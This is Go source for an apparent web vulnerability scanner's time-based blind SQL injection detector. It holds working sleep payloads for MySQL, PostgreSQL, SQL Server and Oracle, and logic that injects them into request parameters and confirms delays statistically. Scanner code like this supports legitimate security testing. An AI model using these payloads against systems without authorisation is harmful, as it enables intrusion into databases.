package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptrace"
	"sort"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

// Statistical time-based SQLi.
//
// Naive time-based detection ("I injected SLEEP(5) and the response took >5s") is a
// notorious false-positive source: a slow endpoint, a WAF tarpit, GC pauses, or
// network jitter all look identical to a real delay. This engine does NOT trust a
// single timer. It:
//
//  1. Measures SERVER think-time, not wall-clock — via httptrace it times from
//     "request fully written" to "first response byte" (TTFB), which excludes
//     connection/TLS setup and body-download time. A warm keep-alive connection is
//     established first so no handshake is counted. This is the same quantity curl's
//     time_starttransfer isolates.
//  2. Uses the MEDIAN of several samples at each point, so a single jittery request
//     cannot decide anything, and cancels the constant network RTT via the
//     baseline-vs-injected DIFFERENCE.
//  3. Proves the delay is CAUSED BY OUR SLEEP by requiring it to scale LINEARLY with
//     the injected sleep across sleep=0, 2, and 5 seconds: sleep(0) must stay ≈
//     baseline (the payload itself isn't slow), sleep(2) must add ≈2s, sleep(5) must
//     add ≈5s, and the injected distribution must not overlap the baseline. A fixed
//     slow endpoint or a WAF delay fails the scaling test and is rejected.
//
// The timing proof itself is the evidence (baseline vs the linear sleep response),
// exactly the "either time is the proof, or a name is" bar.

// sqliTimingClient reuses the pooled transport; the per-request deadline (sleep+
// margin) is set via context, so a real SLEEP can complete while a hung host can't
// stall the scan forever.
var sqliTimingClient = &http.Client{
	Transport: sharedHTTPTransport,
	CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// timingPayload is one DBMS-specific sleep vector; Build injects a given number of
// seconds into the parameter value for a numeric or quoted context.
type timingPayload struct {
	dbms  string
	build func(value string, sec int) string
}

func timingPayloads() []timingPayload {
	s := strconv.Itoa
	return []timingPayload{
		// MySQL / MariaDB — numeric and single/double-quoted string contexts.
		{"mysql", func(v string, n int) string { return v + " AND SLEEP(" + s(n) + ")" }},
		{"mysql", func(v string, n int) string { return v + " AND IF(1=1,SLEEP(" + s(n) + "),0)" }},
		{"mysql", func(v string, n int) string { return v + "' AND SLEEP(" + s(n) + ")-- -" }},
		{"mysql", func(v string, n int) string { return v + "\" AND SLEEP(" + s(n) + ")-- -" }},
		{"mysql", func(v string, n int) string { return v + "') AND SLEEP(" + s(n) + ")-- -" }},
		// PostgreSQL.
		{"postgresql", func(v string, n int) string { return v + " AND 1=(SELECT 1 FROM pg_sleep(" + s(n) + "))" }},
		{"postgresql", func(v string, n int) string { return v + "' AND 1=(SELECT 1 FROM pg_sleep(" + s(n) + "))-- -" }},
		{"postgresql", func(v string, n int) string { return v + "';SELECT pg_sleep(" + s(n) + ")-- -" }},
		// Microsoft SQL Server.
		{"mssql", func(v string, n int) string { return v + ";WAITFOR DELAY '0:0:" + s(n) + "'-- -" }},
		{"mssql", func(v string, n int) string { return v + "';WAITFOR DELAY '0:0:" + s(n) + "'-- -" }},
		{"mssql", func(v string, n int) string { return v + "');WAITFOR DELAY '0:0:" + s(n) + "'-- -" }},
		// Oracle.
		{"oracle", func(v string, n int) string { return v + " AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)," + s(n) + ")" }},
		{"oracle", func(v string, n int) string { return v + "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)," + s(n) + ")-- -" }},
	}
}

// serverTTFB sends one injected request and returns the server think-time (write-
// complete → first response byte). ok=false on transport error.
func serverTTFB(ctx context.Context, ip insertionPoint, value string, auth map[string]string, deadline time.Duration) (time.Duration, bool) {
	rctx, cancel := context.WithTimeout(ctx, deadline)
	defer cancel()
	req, err := buildInjectedRequest(rctx, ip, value, auth)
	if err != nil {
		return 0, false
	}
	var wrote time.Time
	var ttfb time.Duration
	trace := &httptrace.ClientTrace{
		WroteRequest:         func(httptrace.WroteRequestInfo) { wrote = time.Now() },
		GotFirstResponseByte: func() { ttfb = time.Since(wrote) },
	}
	req = req.WithContext(httptrace.WithClientTrace(req.Context(), trace))
	resp, err := sqliTimingClient.Do(req)
	if err != nil {
		return 0, false
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if ttfb <= 0 {
		return 0, false
	}
	return ttfb, true
}

// sampleTTFB takes n TTFB samples and returns their median, min and max.
func sampleTTFB(ctx context.Context, ip insertionPoint, value string, auth map[string]string, n int, deadline time.Duration) (median, min, max time.Duration, ok bool) {
	var ds []time.Duration
	for i := 0; i < n; i++ {
		if ctx.Err() != nil {
			break
		}
		d, good := serverTTFB(ctx, ip, value, auth, deadline)
		if good {
			ds = append(ds, d)
		}
	}
	if len(ds) == 0 {
		return 0, 0, 0, false
	}
	sort.Slice(ds, func(i, j int) bool { return ds[i] < ds[j] })
	return ds[len(ds)/2], ds[0], ds[len(ds)-1], true
}

// timeBasedSQLi returns (dbms, evidence, true) only when the induced delay scales
// LINEARLY with the injected sleep — proven server-side SLEEP, not noise.
func (s *SQLiScanner) timeBasedSQLi(ctx context.Context, ip insertionPoint, auth map[string]string) (string, string, bool) {
	baseValue := sqliBaseValue(ip)
	// Warm the connection so no TLS/TCP handshake is counted in the first sample.
	_, _ = serverTTFB(ctx, ip, baseValue, auth, 8*time.Second)

	base, _, baseMax, ok := sampleTTFB(ctx, ip, baseValue, auth, 3, 8*time.Second)
	if !ok {
		return "", "", false
	}
	// Noise gate: an endpoint that is already slow or wildly jittery cannot support a
	// trustworthy timing verdict — skip it rather than risk a false positive.
	if base > 3*time.Second || baseMax > base+2*time.Second {
		return "", "", false
	}

	for _, p := range timingPayloads() {
		if ctx.Err() != nil {
			break
		}
		val := baseValue
		dl := 12 * time.Second
		// Cheap screen: one sleep(5) request eliminates a non-vulnerable DBMS
		// vector. Only a delayed response pays for the full three-sample proof.
		fast5, ok := serverTTFB(ctx, ip, p.build(val, 5), auth, dl)
		if !ok || fast5-base < 3500*time.Millisecond {
			continue
		}
		// Confirm: sleep(5) must add a clear, non-overlapping median delay.
		i5, i5min, _, ok := sampleTTFB(ctx, ip, p.build(val, 5), auth, 3, dl)
		if !ok || i5-base < 3500*time.Millisecond || i5min < baseMax+2*time.Second {
			continue
		}
		// Control: sleep(0) of the SAME payload must stay ≈ baseline — proves the
		// payload's structure (extra SQL, comments) isn't itself what's slow.
		i0, _, _, ok := sampleTTFB(ctx, ip, p.build(val, 0), auth, 2, dl)
		if !ok || i0 > base+1500*time.Millisecond {
			continue
		}
		// Linear scaling: sleep(2) must add ≈2s and sleep(5)−sleep(2) must be ≈3s.
		i2, _, _, ok := sampleTTFB(ctx, ip, p.build(val, 2), auth, 3, dl)
		if !ok {
			continue
		}
		if !timingScalingConfirmed(base, baseMax, i0, i2, i5, i5min) {
			continue
		}
		add2 := i2 - base
		add5 := i5 - base
		step := i5 - i2
		ev := fmt.Sprintf(
			"Time-based blind SQLi PROVEN by linear delay scaling (server think-time via TTFB, network noise cancelled). "+
				"Baseline≈%dms; injected SLEEP(0)≈%dms (≈baseline → payload not inherently slow), SLEEP(2)≈%dms (+%dms), SLEEP(5)≈%dms (+%dms). "+
				"The induced delay tracks the injected sleep 1:1 (Δ(5-2)≈%dms) and the injected responses do not overlap the baseline — this is a server-side SLEEP executing, not latency/WAF. "+
				"DBMS: %s. Payload: %s",
			base.Milliseconds(), i0.Milliseconds(), i2.Milliseconds(), add2.Milliseconds(),
			i5.Milliseconds(), add5.Milliseconds(), step.Milliseconds(), p.dbms, p.build(val, 5))
		return p.dbms, ev, true
	}
	return "", "", false
}

// timingScalingConfirmed is the pure decision: a time-based verdict holds only when
// the injected delay tracks the sleep 1:1. It requires (a) sleep(0) ≈ baseline (the
// payload structure is not itself slow), (b) sleep(2) adds ≈2s, (c) sleep(5)−sleep(2)
// ≈3s (linear step), and (d) the fastest injected sleep(5) sample does not overlap
// the slowest baseline sample. A fixed slow endpoint, a WAF tarpit, or random jitter
// all fail one of these and are rejected — the anti-false-positive core.
func timingScalingConfirmed(base, baseMax, i0, i2, i5, i5min time.Duration) bool {
	ms := time.Millisecond
	if i0 > base+1500*ms { // control: payload-with-sleep-0 must stay ≈ baseline
		return false
	}
	if i5min < baseMax+2000*ms { // non-overlap with baseline distribution
		return false
	}
	add2 := i2 - base
	if add2 < 1200*ms || add2 > 3500*ms { // sleep(2) ≈ +2s
		return false
	}
	step := i5 - i2
	if step < 2200*ms || step > 4500*ms { // sleep(5)-sleep(2) ≈ +3s (linear)
		return false
	}
	return true
}

// timeBasedPass runs the statistical time-based detector over candidates the
// deterministic pass did not already flag, at low concurrency, and stores any
// linearly-proven finding.
func (s *SQLiScanner) timeBasedPass(ctx context.Context, targetID string, candidates []insertionPoint, flagged map[string]bool, auth map[string]string, found *atomic.Int64, logFn LogFunc) {
	if s.cfg != nil && !s.cfg.SQLiTimeBased {
		return
	}
	var todo []insertionPoint
	for _, ip := range candidates {
		if !flagged[insertionIdentity(ip)] {
			todo = append(todo, ip)
		}
	}
	if len(todo) == 0 {
		return
	}
	logFn("info", "sqli", fmt.Sprintf("Time-based SQLi (statistical, linear-scaling proof) over %d insertion point(s)...", len(todo)))

	sem := make(chan struct{}, 4) // low: each confirmation holds a connection for seconds
	var wg sync.WaitGroup
	for _, ip := range todo {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()
			if dbms, ev, ok := s.timeBasedSQLi(ctx, ip, auth); ok {
				s.store(targetID, "sqli", "high", ip, "time_based",
					ev+" ["+ip.Method+"]")
				found.Add(1)
				logFn("warn", "sqli", fmt.Sprintf("SQLi (time_based/%s): %s param=%s [%s]", dbms, ip.URL, ip.Param, ip.Method))
				s.notify(targetID, ip.URL, ip.Param)
			}
		}(ip)
	}
	wg.Wait()
}
